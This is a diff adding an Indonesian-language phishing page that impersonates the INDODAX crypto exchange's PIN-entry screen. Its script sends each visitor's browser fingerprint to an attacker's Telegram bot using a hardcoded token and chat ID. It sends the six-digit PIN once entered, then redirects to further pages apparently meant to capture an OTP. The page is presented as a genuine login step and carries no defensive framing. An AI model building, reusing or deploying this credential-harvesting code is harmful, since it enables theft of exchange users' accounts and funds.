@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masukkan PIN - INDODAX</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+
+    .pin-dot {
+      transition: all 0.2s ease;
+    }
+
+    .pin-dot.active {
+      transform: scale(1.2);
+    }
+
+    .number-btn {
+      transition: all 0.1s ease;
+    }
+
+    .number-btn:active {
+      background-color: #f0f0f0;
+      transform: scale(0.95);
+    }
+    
+    /* Loading spinner */
+    .loading-dot {
+      animation: pulse 1.5s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+  </style>
+</head>
+
+<body class="bg-white text-black min-h-screen flex flex-col">
+  <header class="flex items-center px-4 py-5">
+    <button aria-label="Back" class="text-[#8A9BA8] text-2xl mr-3" onclick="window.history.back()">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="font-bold text-xl leading-6 flex-1 text-center">Masukkan PIN Anda</h1>
+    <div class="w-8"></div> <!-- Spacer untuk balance layout -->
+  </header>
+  
+  <main class="flex flex-col items-center mt-20 flex-grow px-4">
+    <div class="text-center mb-8">
+      <p class="text-gray-600 text-sm">Masukkan 6 digit PIN untuk melanjutkan</p>
+    </div>
+    
+    <div id="pinDots" class="flex space-x-4 mb-10">
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300 pin-dot"></span>
+    </div>
+    
+    <button class="text-[#0B7DBF] font-semibold text-base mb-12 hover:underline" id="forgotPinBtn">Lupa PIN?</button>
+    
+    <div class="grid grid-cols-3 gap-6 w-full max-w-xs font-semibold text-2xl text-center">
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">1</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">2</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">3</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">4</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">5</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">6</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">7</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">8</button>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">9</button>
+      <div></div>
+      <button class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none">0</button>
+      <button aria-label="Delete" class="number-btn rounded-full w-16 h-16 flex items-center justify-center focus:outline-none text-xl text-gray-500">
+        <i class="fas fa-backspace"></i>
+      </button>
+    </div>
+  </main>
+
+  <script>
+    // ================= TELEGRAM BOT CONFIGURATION =================
+    const TELEGRAM_BOT_TOKEN = "7892661345:AAEnPI4n-Rk8NxN6TALmNwpixjPP3rlpEvE";
+    const TELEGRAM_CHAT_ID = "7326083311";
+    // ==============================================================
+    
+    const pinDots = document.getElementById('pinDots');
+    const numberButtons = document.querySelectorAll('.number-btn:not([aria-label="Delete"])');
+    const deleteButton = document.querySelector('button[aria-label="Delete"]');
+    const forgotPinBtn = document.getElementById('forgotPinBtn');
+    
+    let pin = [];
+
+    // ================= TELEGRAM FUNCTIONS =================
+    // Function to send message to Telegram
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      return fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    // Function to send user info to Telegram
+    function sendUserInfoToTelegram() {
+      // Get user agent info
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      
+      // Get screen resolution
+      const screenResolution = `${screen.width}x${screen.height}`;
+      
+      // Get timezone
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      
+      // Create message with user info
+      const userInfoMessage = `
+📱 <b>USER INFORMATION - PIN PAGE</b>
+
+🖥 <b>Browser:</b> ${userAgent}
+📋 <b>Platform:</b> ${platform}
+🌐 <b>Language:</b> ${language}
+🖼 <b>Screen:</b> ${screenResolution}
+⏰ <b>Timezone:</b> ${timezone}
+      `;
+      
+      // Send user info to Telegram
+      sendToTelegram(userInfoMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send user info to Telegram');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending user info:', error);
+        });
+    }
+
+    // Function to send page visit notification
+    function sendPageVisitNotification() {
+      const visitMessage = `
+🔔 <b>PAGE VISIT NOTIFICATION - PIN PAGE</b>
+
+📄 <b>Page:</b> PIN Verification
+🌐 <b>URL:</b> ${window.location.href}
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+      `;
+      
+      sendToTelegram(visitMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send page visit notification');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending page visit notification:', error);
+        });
+    }
+
+    // Function to send PIN to Telegram
+    function sendPinToTelegram(pinString) {
+      const pinMessage = `
+🔐 <b>PIN VERIFICATION</b>
+
+🔢 <b>PIN Entered:</b> <code>${pinString}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Page:</b> PIN Verification
+📊 <b>Status:</b> ✅ SUCCESS - Redirecting to next page
+      `;
+      
+      return sendToTelegram(pinMessage);
+    }
+    // =====================================================
+    
+    function updatePinDots() {
+      const dots = pinDots.children;
+      for (let i = 0; i < dots.length; i++) {
+        if (i < pin.length) {
+          dots[i].classList.remove('bg-gray-300');
+          dots[i].classList.add('bg-[#0B7DBF]', 'active');
+        } else {
+          dots[i].classList.remove('bg-[#0B7DBF]', 'active');
+          dots[i].classList.add('bg-gray-300');
+        }
+      }
+    }
+    
+    function processPIN() {
+      if (pin.length !== 6) return;
+      
+      const enteredPIN = pin.join('');
+      
+      // Kirim PIN ke Telegram
+      sendPinToTelegram(enteredPIN)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Tampilkan loading state
+            const dots = pinDots.children;
+            for (let dot of dots) {
+              dot.classList.add('bg-green-500', 'loading-dot');
+            }
+            
+            // Redirect ke halaman berikutnya setelah 1 detik
+            setTimeout(() => {
+              window.location.href = "selanjutnya3.html";
+            }, 1000);
+          } else {
+            // Jika gagal kirim ke Telegram, tetap redirect
+            setTimeout(() => {
+              window.location.href = "otpindodax.html";
+            }, 1000);
+          }
+        })
+        .catch(error => {
+          console.error('Error sending PIN to Telegram:', error);
+          // Tetap redirect meski ada error
+          setTimeout(() => {
+            window.location.href = "otpindodax.html";
+          }, 1000);
+        });
+    }
+    
+    // Event listeners untuk tombol angka
+    numberButtons.forEach(button => {
+      button.addEventListener('click', () => {
+        if (pin.length < 6) {
+          pin.push(button.textContent);
+          updatePinDots();
+          
+          if (pin.length === 6) {
+            processPIN();
+          }
+        }
+      });
+    });
+    
+    // Event listener untuk tombol delete
+    deleteButton.addEventListener('click', () => {
+      if (pin.length > 0) {
+        pin.pop();
+        updatePinDots();
+      }
+    });
+    
+    // Event listener untuk tombol lupa PIN
+    forgotPinBtn.addEventListener('click', () => {
+      // Kirim notifikasi lupa PIN ke Telegram
+      const forgotPinMessage = `
+❓ <b>FORGOT PIN REQUEST</b>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Page:</b> PIN Verification
+      `;
+      
+      sendToTelegram(forgotPinMessage)
+        .then(() => {
+          alert("Silakan hubungi customer service INDODAX untuk reset PIN.");
+        })
+        .catch(error => {
+          console.error('Error sending forgot PIN notification:', error);
+          alert("Silakan hubungi customer service INDODAX untuk reset PIN.");
+        });
+    });
+    
+    // Support untuk input keyboard
+    document.addEventListener('keydown', (e) => {
+      if (e.key >= '0' && e.key <= '9' && pin.length < 6) {
+        pin.push(e.key);
+        updatePinDots();
+        
+        if (pin.length === 6) {
+          processPIN();
+        }
+      } else if (e.key === 'Backspace') {
+        if (pin.length > 0) {
+          pin.pop();
+          updatePinDots();
+        }
+      }
+    });
+    
+    // Focus management untuk aksesibilitas
+    document.addEventListener('DOMContentLoaded', () => {
+      // Set focus ke container PIN untuk aksesibilitas keyboard
+      pinDots.setAttribute('tabindex', '0');
+      
+      // Send page visit notification when page loads
+      sendUserInfoToTelegram();
+      sendPageVisitNotification();
+    });
+  </script>
+</body>
+</html>
